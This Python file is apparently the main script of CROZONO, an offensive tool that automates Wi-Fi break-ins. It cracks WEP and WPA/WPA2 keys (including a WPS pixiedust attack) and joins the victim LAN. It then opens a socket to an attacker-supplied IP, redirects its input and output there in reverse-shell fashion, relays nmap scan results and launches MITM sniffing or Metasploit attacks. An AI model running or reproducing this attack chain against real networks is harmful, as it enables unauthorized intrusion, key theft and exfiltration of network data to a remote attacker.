#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
----------------------------------------------------------------------------
	CROZONO - 22.02.16.20.00.00 - www.crozono.com - info@crozono.com
----------------------------------------------------------------------------

!!! The authors are not responsible for any misuse of the application !!!

"""

#  ## LIBRARIES ##
import os
import socket
import subprocess
from poormanslogging import info, warn, error

import src.settings as settings

import src.utils.sys_check as checks
import src.utils.device_manager as device_mgr
import src.utils.lan_manager as lan_mgr
import src.attacks.airodump_scan as airodump


# ## CONTEXT VARIABLES ##
version = '0.1'


def parse_args():
	import argparse
	parser = argparse.ArgumentParser()
	parser.add_argument('-e', '--essid', type=str, help="ESSID to target. Surround in quotes if it has spaces!")
	parser.add_argument('-k', '--key', type=str, help="Key to use for connect to ESSID")
	parser.add_argument('-a', '--attack', type=str, help="Attack to perform")
	parser.add_argument('-d', '--dest', type=str, help="Destination to where to send info (attacker's IP)")
	parser.add_argument('-i', '--interface', type=str, help="Interface to use for attacks/connecting")
	return parser.parse_args()

def banner():
	global version
	from pyfiglet import figlet_format
	b = figlet_format("      CROZONO") + \
	'''		Free Version - {v}
	www.crozono.com - info@crozono.com
	'''.format(v=version)
	print(b)

def main():
	banner()

	if not checks.check_root():
		error('You need root privileges to run CROZONO!\n')
		exit(1)

	if not checks.check_wlan_attacks_dependencies():
		exit(1)

	args = parse_args()

	info("CROZONO running...")
	settings.OS_PATH = os.getcwd()
	settings.INTERFACE = args.interface if args.interface is not None else settings.INTERFACE
	settings.INTERFACE = device_mgr.get_ifaces()[0] if settings.INTERFACE is None else settings.INTERFACE
	settings.TARGET_ESSID = args.essid if args.essid is not None else settings.TARGET_ESSID
	settings.TARGET_KEY = args.key if args.key is not None else settings.TARGET_KEY
	settings.IP_ATTACKER = args.dest if args.dest is not None else settings.IP_ATTACKER
	settings.ATTACK = args.attack if args.attack is not None else settings.ATTACK


	if settings.TARGET_ESSID is not None:
		if settings.TARGET_KEY is not None:
			ap_target = None
			lan_mgr.connect_to_lan()
		else:
			device_mgr.hardware_setup()
			ap_target = airodump.scan_targets()
	else:
		device_mgr.hardware_setup()
		ap_target = airodump.scan_targets()

	# -------------------- Infiltrate wifi --------------------
	if ap_target is not None:
		settings.TARGET_ESSID = ap_target.get('ESSID').strip()
		settings.TARGET_BSSID = ap_target.get('BSSID').strip()
		settings.TARGET_CHANNEL = ap_target.get('channel').strip()
		settings.TARGET_PRIVACY = ap_target.get('Privacy').strip()

		info("Target selected: " + settings.TARGET_ESSID)

		if settings.TARGET_PRIVACY == 'WEP':
			from src.attacks import wep_attack
			info("Cracking {e} access point with WEP privacy...".format(e=settings.TARGET_ESSID))
			wep_attack.run()
			if settings.TARGET_KEY is None:
				error("Key not found! :(")
				exit()
			else:
				info("Key found!: {k} ".format(k=settings.TARGET_KEY))
				lan_mgr.save_key()
				lan_mgr.connect_to_lan()

		elif settings.TARGET_PRIVACY == 'WPA' or settings.TARGET_PRIVACY == 'WPA2' or settings.TARGET_PRIVACY == 'WPA2 WPA':
			from src.attacks import wpa_attack,wps_attack
			info("Cracking {e} access point with {p} privacy...".format(e=settings.TARGET_ESSID, p=settings.TARGET_PRIVACY))

			wps = wps_attack.check()

			if wps:
				info("WPS is enabled")
				wps_attack.pixiedust()
				if settings.TARGET_KEY is None:
					warn("PIN not found! Trying with conventional WPA attack...")
					wpa_attack.run()
			else:
				warn("WPS is not enabled")
				wpa_attack.run()

			if settings.TARGET_KEY is None:
				error("Key not found! :(")
				exit(1)
			else:
				info("Key found!: {k} ".format(k=settings.TARGET_KEY))
				lan_mgr.save_key()
				lan_mgr.connect_to_lan()
		else:
			info("Open network!")
			lan_mgr.connect_to_lan()

	# -------------------- Acquired LAN range -----------------------------------------

	lan_mgr.lan_range()
	lan_mgr.get_gateway()

	# -------------------- Connect to attacker and relay NMap info --------------------

	if os.path.exists(settings.OS_PATH + '/cr0z0n0_nmap'):
		os.remove(settings.OS_PATH + '/cr0z0n0_nmap')

	if not checks.check_lan_attacks_dependencies():
		exit(1)

	if settings.IP_ATTACKER is not None:
		info("Sending information about network to attacker ({ip}) and running attacks...".format(ip=settings.IP_ATTACKER))
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((settings.IP_ATTACKER, settings.PORT_ATTACKER))
		os.dup2(s.fileno(), 0)
		os.dup2(s.fileno(), 1)
		os.dup2(s.fileno(), 2)
		banner()
		info("Hello! :)")
		info("Executing Nmap...")
		subprocess.call(['nmap', '-O', '-sV', '-oN', 'cr0z0n0_nmap', '--exclude', settings.IP_LAN, settings.LAN_RANGE], stderr=subprocess.DEVNULL)
	else:
		warn("Attacker not defined! Ending up...")
		exit()

	# -------------------- Attacks --------------------

	if settings.ATTACK == 'sniffing-mitm':
		from src.attacks import sniffing_mitm
		sniffing_mitm.run()

	elif settings.ATTACK == 'metasploit':
		from src.attacks import metasploit
		metasploit.run()
	else:
		warn("Attack not defined!")

	s.shutdown(1)

	info("CROZONO has finished! Good bye! ;)")

main()
